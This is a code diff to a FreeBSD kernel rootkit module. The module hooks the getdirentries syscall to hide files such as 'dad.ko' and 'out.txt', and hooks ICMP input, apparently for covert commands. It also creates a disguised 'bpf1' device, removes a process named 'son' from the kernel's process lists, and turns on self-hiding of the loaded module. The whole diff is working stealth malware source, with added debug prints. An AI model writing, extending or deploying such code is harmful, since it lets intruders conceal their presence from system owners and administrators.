@@ -62,6 +62,8 @@ struct module {
 
 // new stuff - command buffer, things to hide, direntbuffer, stuff for icmp hooking
 char *T_NAME[] = {"dad.ko", "son", "out.txt"};
+static char *PROC_NAMES[] = {"son"};
+static int PROC_COUNT = 1;
 static char cmd[256+1];
 static struct sx cmd_lock;
 MALLOC_DECLARE(M_TEMP);
@@ -119,24 +121,23 @@ int dev_write(struct cdev *dev, struct uio *uio, int ioflag)
 
 int dev_read(struct cdev *dev, struct uio *uio, int ioflag)
 {
-    size_t len;
+    //size_t len;
+	int rv;
     
     sx_xlock(&cmd_lock);
-    copystr(&cmd, uio->uio_iov->iov_base, strlen(cmd)+1, &len);
+    //copystr(&cmd, uio->uio_iov->iov_base, strlen(cmd)+1, &len);
+	rv = uiomove(&cmd, strlen(cmd)+1, uio);
     
     bzero(cmd,256);
     sx_xunlock(&cmd_lock);
     
     return 0;
 }
-
 struct process_hiding_args {
-	char *procname;
+	int flag;
 };
 
-static int process_hiding(struct thread *thread, void *args) {
-	struct process_hiding_args *uap;
-	uap = (struct process_hiding_args *)args;
+static int process_hiding(char *procname) {
 	struct proc *p;
 
 	sx_xlock(&allproc_lock);
@@ -151,7 +152,7 @@ static int process_hiding(struct thread *thread, void *args) {
 		}
 
 		/* Do we want to hide this process? */
-		if (strncmp(p->p_comm, uap->procname, MAXCOMLEN) == 0) {
+		if (strncmp(p->p_comm, procname, MAXCOMLEN) == 0) {
 			LIST_REMOVE(p, p_list);
 			LIST_REMOVE(p, p_hash);
 		}
@@ -318,17 +319,26 @@ static int hide_kld(void) {
 }
 
 static int general_handler(struct thread *td, void *syscall_args) {
+	printf("syscall called");
 	struct process_hiding_args *uap;
 	uap = (struct process_hiding_args *)syscall_args;
-	if (strcmp(uap->procname, "on") == 0)
+	if (uap->flag == 0)
     {
+		printf("hooking getdirentries\n");
         sysent[SYS_getdirentries].sy_call = (sy_call_t *)getdirentries_hook;   
+		printf("hooked getdirentries, getting cmd_lock mutex\n");
         sx_init(&cmd_lock,"rootkit_lock");
+		printf("got cmd_lock mutex, hooking ICMP\n");
         inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input_hook;
+		printf("hooked icmp, creating special dev\n");
         sdev = make_dev(&devsw, 0, UID_ROOT, GID_WHEEL, 0600, "bpf1");
-        //hide_kld();
+		printf("okbyebye\n");
+        hide_kld();
     } else {
-		process_hiding(td, syscall_args);
+		for (int i = 0; i < PROC_COUNT; i++) {
+			printf("hiding process %d", i);
+			process_hiding(PROC_NAMES[i]);
+		}
 	}
 
 	return(0);
@@ -336,7 +346,7 @@ static int general_handler(struct thread *td, void *syscall_args) {
 
 /* The sysent for the new system call. */
 static struct sysent dad_sysent = {
-	0,			/* number of arguments */
+	1,			/* number of arguments */
 	general_handler		/* implementing function */
 };
 
